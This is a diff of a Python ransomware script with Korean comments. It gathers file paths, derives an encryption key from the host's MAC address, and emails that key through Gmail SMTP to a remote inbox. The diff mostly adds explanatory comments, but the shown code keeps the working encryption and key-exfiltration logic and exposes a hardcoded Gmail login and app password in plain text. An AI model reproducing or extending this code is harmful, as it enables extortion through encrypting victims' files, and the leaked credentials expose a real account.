@@ -50,8 +50,8 @@ def isFile(llist, llink):
 isFile(file_list, link)
 
 linkForChange_set = set(linkForChange)
-linkForChange = list(linkForChange_set)
-print(linkForChange)
+linkForChange = list(linkForChange_set) #list에서 겹치는 파일을 제거
+print(linkForChange) 
 '''
 for i in range(0, len(linkForChange)):
     Encryption(linkForChange[i])
@@ -63,9 +63,10 @@ chunksize = 256*1024
 
 extension = [] #확장자 list
 file_name = [] #파일 이름 list
+#list의 index에 맞게 이름과 확장자 분리하여 저장 - 나중에 복호화 시 사용하기 위함
 
 print("**암호화**")
-print(hex(uuid.getnode()).encode('utf8'))
+print(hex(uuid.getnode()).encode('utf8')) #나중에 삭제!!! 테스트하기 쉬우라고 화면에 복호화 키 출력
 original_password = hex(uuid.getnode()).encode('utf8')  #mac address를 받아 16진수로 변환하여 암호로 사용
 
 smtp = smtplib.SMTP('smtp.gmail.com', 587)
@@ -73,7 +74,7 @@ smtp.starttls()  # TLS 사용시 필요
 smtp.login('pythonransomware@gmail.com', 'bnzrajjwqrzllgvf') #복호화 키를 보낼 이메일 등록 - 주소, 비밀번호
 
 msg = MIMEText(hex(uuid.getnode())) #복호화 키
-msg['Subject'] = '테스트'
+msg['Subject'] = '테스트'  
 smtp.sendmail('pythonransomware@gmail.com', 'tlatmdals01@gmail.com', msg.as_string()) #복호화 키를 보낼 이메일, 복호화 키를 받을 이메일
 
 smtp.quit()
@@ -87,7 +88,7 @@ key = hashlib.pbkdf2_hmac(hash_name='sha256', password=original_password, salt=b
 for k in range(0, len(linkForChange)):
 
     fileFullname = linkForChange[k] 
-    filename, FileExtension = os.path.splitext(linkForChange[k])
+    filename, FileExtension = os.path.splitext(linkForChange[k]) #파일의 이름과 확장자를 분리하여 각각 변수에 
 
     extension.append(FileExtension) #확장자를 list에 추가
     file_name.append(filename) #파일 이름을 list에 추가
